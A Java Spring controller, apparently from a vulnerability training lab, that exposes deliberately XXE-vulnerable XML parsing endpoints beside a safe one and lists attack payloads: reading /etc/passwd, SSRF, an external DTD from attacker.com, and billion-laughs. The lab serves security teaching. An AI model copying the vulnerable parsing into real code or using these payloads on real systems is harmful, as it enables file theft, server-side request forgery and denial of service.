package com.owaspvulnlab.vulnerability.xxe;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.*;

import java.util.HashMap;
import java.util.Map;

@RestController
@RequestMapping("/api/xxe")
@CrossOrigin(origins = "*")
public class XxeController {

    @Autowired
    private XxeService xxeService;

    /**
     * 易受XXE攻击的XML解析接口 - DOM4J
     */
    @PostMapping("/vulnerable/dom4j")
    public Map<String, Object> vulnerableParseWithDom4j(@RequestBody Map<String, String> request) {
        String xmlContent = request.get("xml");
        return xxeService.vulnerableParseWithDom4j(xmlContent);
    }

    /**
     * 易受XXE攻击的XML解析接口 - DocumentBuilder
     */
    @PostMapping("/vulnerable/documentbuilder")
    public Map<String, Object> vulnerableParseWithDocumentBuilder(@RequestBody Map<String, String> request) {
        String xmlContent = request.get("xml");
        return xxeService.vulnerableParseWithDocumentBuilder(xmlContent);
    }

    /**
     * 安全的XML解析接口
     */
    @PostMapping("/safe/parse")
    public Map<String, Object> safeParseXml(@RequestBody Map<String, String> request) {
        String xmlContent = request.get("xml");
        return xxeService.safeParseXml(xmlContent);
    }

    /**
     * 模拟文件读取XXE攻击
     */
    @GetMapping("/attack/file-read")
    public Map<String, Object> simulateFileReadAttack() {
        return xxeService.simulateFileReadAttack();
    }

    /**
     * 模拟SSRF XXE攻击
     */
    @GetMapping("/attack/ssrf")
    public Map<String, Object> simulateSsrfAttack() {
        return xxeService.simulateSsrfAttack();
    }

    /**
     * 生成测试XML
     */
    @GetMapping("/test-xml")
    public Map<String, Object> generateTestXml() {
        return xxeService.generateTestXml();
    }

    /**
     * 获取XXE测试说明
     */
    @GetMapping("/info")
    public Map<String, Object> getInfo() {
        Map<String, Object> result = new HashMap<>();
        result.put("vulnerability", "XML External Entity (XXE)");
        result.put("description", "XXE是一种攻击技术，利用XML解析器处理外部实体时的安全缺陷，可能导致文件读取、SSRF、拒绝服务等攻击。");
        
        Map<String, Object> endpoints = new HashMap<>();
        endpoints.put("vulnerable_dom4j", "/api/xxe/vulnerable/dom4j - 易受攻击的DOM4J解析");
        endpoints.put("vulnerable_documentbuilder", "/api/xxe/vulnerable/documentbuilder - 易受攻击的DocumentBuilder解析");
        endpoints.put("safe_parse", "/api/xxe/safe/parse - 安全的XML解析");
        endpoints.put("attack_file_read", "/api/xxe/attack/file-read - 文件读取攻击演示");
        endpoints.put("attack_ssrf", "/api/xxe/attack/ssrf - SSRF攻击演示");
        endpoints.put("test_xml", "/api/xxe/test-xml - 获取测试XML");
        result.put("endpoints", endpoints);
        
        Map<String, Object> attackTypes = new HashMap<>();
        attackTypes.put("file_read", "文件读取 - 读取服务器本地文件");
        attackTypes.put("ssrf", "SSRF - 通过XXE发起服务器端请求伪造");
        attackTypes.put("dos", "拒绝服务 - 通过递归实体引用消耗资源");
        attackTypes.put("port_scan", "端口扫描 - 探测内网端口状态");
        result.put("attack_types", attackTypes);
        
        Map<String, Object> testPayloads = new HashMap<>();
        testPayloads.put("file_read", "<!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>");
        testPayloads.put("ssrf", "<!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://127.0.0.1:8080/\">]><root>&xxe;</root>");
        testPayloads.put("parameter_entity", "<!DOCTYPE root [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\"> %xxe;]><root></root>");
        testPayloads.put("billion_laughs", "<!DOCTYPE root [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">]><root>&lol2;</root>");
        result.put("test_payloads", testPayloads);
        
        Map<String, Object> prevention = new HashMap<>();
        prevention.put("disable_dtd", "禁用DTD处理");
        prevention.put("disable_external_entities", "禁用外部实体引用");
        prevention.put("use_safe_parsers", "使用安全配置的XML解析器");
        prevention.put("input_validation", "对XML输入进行严格验证");
        result.put("prevention", prevention);
        
        return result;
    }
}